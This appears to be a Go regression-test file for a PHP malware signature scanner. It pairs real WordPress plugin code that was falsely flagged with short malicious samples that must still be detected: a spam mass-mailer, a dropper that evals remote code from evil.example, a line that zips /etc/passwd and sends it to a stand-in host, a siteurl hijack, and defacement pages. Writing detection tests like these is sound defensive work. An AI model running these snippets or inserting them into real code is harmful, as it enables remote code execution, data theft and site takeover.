package signatures

import (
	"path/filepath"
	"runtime"
	"testing"
)

// loadRepoScanner loads the production rules from configs/ so regression tests
// run against the same YAML the daemon ships.
func loadRepoScanner(t *testing.T) *Scanner {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	scanner := NewScanner(configsDir)
	if scanner.RuleCount() == 0 {
		t.Fatal("expected repository rules to load")
	}
	return scanner
}

// FP reconstructions for 2026-04-17 cluster6 unzip event.
//
// Each rule below fired on a legitimate WordPress plugin file because the
// rule accepted pattern-substring matches without its tightening regex.
// The negative cases below reproduce the real FPs; the positive cases keep
// actual malicious shapes detectable after the fix.

func TestMailerMassSender_CF7ValidationFunctions(t *testing.T) {
	scanner := loadRepoScanner(t)

	// Contact Form 7 validation-functions.php: iterates email list, no real
	// sending. Substring "mail(" appears inside is_email(, wp_mail(, etc.
	legit := []byte(`<?php
function wpcf7_is_mailbox_list( $mailbox_list ) {
	$email_list = is_array( $mailbox_list )
		? $mailbox_list
		: preg_split( '/[\s,]+/', trim( (string) $mailbox_list ) );

	foreach ( $email_list as $email ) {
		if ( ! is_email( $email ) ) {
			return false;
		}
	}
	return $email_list;
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "mailer_mass_sender") {
		t.Error("mailer_mass_sender FP: matched CF7 validation-functions.php (substring 'mail(' inside 'is_email(' is not an exploit)")
	}

	// Real mass-sender shape: one-line loop so the rule's regex
	// (?:while|foreach).*(?:fgets|\$emails).*mail\s*\( can match.
	malicious := []byte(`<?php $fh = fopen('targets.txt','r'); while ($e = fgets($fh)) mail($e, 'Win prize', 'Click http://evil/');`)
	matches = scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "mailer_mass_sender") {
		t.Error("mailer_mass_sender regression: real mass-mailer loop was not detected")
	}
}

func TestExfilArchiveSend_WPMLZipLibrary(t *testing.T) {
	scanner := loadRepoScanner(t)

	// WPML bundles the PHPZip library (wpml_zip.php). It has both tokens
	// "ZipArchive" and "addFile(" but no exfiltration sink.
	legit := []byte(`<?php
/**
 * Class to create and manage a Zip file.
 * @author A. Grandt
 * Initially inspired by CreateZipFile. License: GNU LGPL 2.1.
 */
class wpml_zip {
	const VERSION = 1.62;
	// ZipArchive compatible API wrapper.
	public function addFile( $data, $filePath, $fileComment = null ) {
		$this->buildZipEntry( $filePath, $fileComment, $data, 0x0808, 0x08 );
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "exfil_archive_send") {
		t.Error("exfil_archive_send FP: matched WPML wpml_zip.php (zip library with no exfil sink)")
	}

	// Real exfiltration shape: single-line chain so the rule's regex
	// new\s+ZipArchive.*addFile.*(?:mail|curl|fwrite|readfile) can match.
	malicious := []byte(`<?php $z = new ZipArchive(); $z->open('/tmp/d.zip', 1); $z->addFile('/etc/passwd'); fwrite(fsockopen('evil',80), 'PWND');`)
	matches = scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "exfil_archive_send") {
		t.Error("exfil_archive_send regression: real zip+fwrite exfil chain was not detected")
	}
}

func TestDropperFgcEval_TwigIntegrationTestCase(t *testing.T) {
	scanner := loadRepoScanner(t)

	// Twig IntegrationTestCase: has both file_get_contents( and eval( tokens
	// but they are not adjacent in an eval(file_get_contents(...)) chain.
	legit := []byte(`<?php
abstract class Twig_Test_IntegrationTestCase extends \PHPUnit\Framework\TestCase {
	protected function parseTemplates($test) {
		$ret = [];
		$templates = file_get_contents($test);
		return $ret;
	}
	private function evaluateTemplate($tpl) {
		$compiled = $tpl->getCompiledSource();
		return eval($compiled);
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "dropper_fgc_eval") {
		t.Error("dropper_fgc_eval FP: matched Twig IntegrationTestCase.php (tokens far apart, no eval(file_get_contents(...)) chain)")
	}

	// Real dropper: eval straight off a remote fetch.
	malicious := []byte(`<?php
eval(file_get_contents('http://evil.example/payload.txt'));
`)
	matches = scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "dropper_fgc_eval") {
		t.Error("dropper_fgc_eval regression: eval(file_get_contents(url)) was not detected")
	}
}

func TestSpamWpOptionsInject_WPMLSitepress(t *testing.T) {
	scanner := loadRepoScanner(t)

	// WPML sitepress.php: legitimate reads of wp_options / siteurl through
	// get_option, not direct $wpdb->query/update/replace on wp_options.
	legit := []byte(`<?php
class SitePress {
	public function init_settings() {
		$home = get_option( 'home' );
		$site = get_option( 'siteurl' );
		// table reference in doc comment: wp_options holds site meta
		$this->current_site = $site;
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "spam_wp_options_inject") {
		t.Error("spam_wp_options_inject FP: matched WPML sitepress.php (get_option() reads, not wpdb writes)")
	}

	// Real spam injection: single-line wpdb->update so the rule's regex
	// \$wpdb->(?:query|update|replace).*wp_options.*(?:siteurl|home|blogname) can match.
	malicious := []byte(`<?php $wpdb->update('wp_options', array('option_value' => 'http://spam/'), array('option_name' => 'siteurl'));`)
	matches = scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "spam_wp_options_inject") {
		t.Error("spam_wp_options_inject regression: direct wpdb update of wp_options siteurl was not detected")
	}
}

func TestDefaceOwnedBy_FreemiusClass(t *testing.T) {
	scanner := loadRepoScanner(t)

	// Freemius class-freemius.php: phrase "Owned by" appears in a PHP
	// docblock / copyright, not in a defacement HTML page.
	legit := []byte(`<?php
/**
 * @package     Freemius
 * @copyright   Copyright (c) 2015, Freemius, Inc.
 * @license     GPL-2.0
 * @since       1.0.3
 *
 * This file is part of the plugin Owned by the site operator via Freemius.
 */
class Freemius extends Freemius_Abstract {
	public function get_owned_by_user_id() {
		return $this->_storage->owned_by;
	}
}
`)
	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "deface_owned_by") {
		t.Error("deface_owned_by FP: matched Freemius class-freemius.php (phrase in PHP docblock, no HTML page context)")
	}

	// Real defacement: HTML page with "Owned by <handle>" signature.
	malicious := []byte(`<html>
<head><title>Owned by Xr00t</title></head>
<body>
<center><h1>Owned by Xr00t</h1></center>
<p>your security is a joke</p>
</body>
</html>
`)
	matches = scanner.ScanContent(malicious, ".html")
	if !hasRule(matches, "deface_owned_by") {
		t.Error("deface_owned_by regression: HTML defacement page was not detected")
	}

	// Real defacement delivered as .php that renders HTML.
	maliciousPHP := []byte(`<?php header('Content-Type: text/html'); ?>
<html>
<body>
<h1>Owned by Xr00t</h1>
</body>
</html>
`)
	matches = scanner.ScanContent(maliciousPHP, ".php")
	if !hasRule(matches, "deface_owned_by") {
		t.Error("deface_owned_by regression: PHP-rendered defacement page was not detected")
	}
}
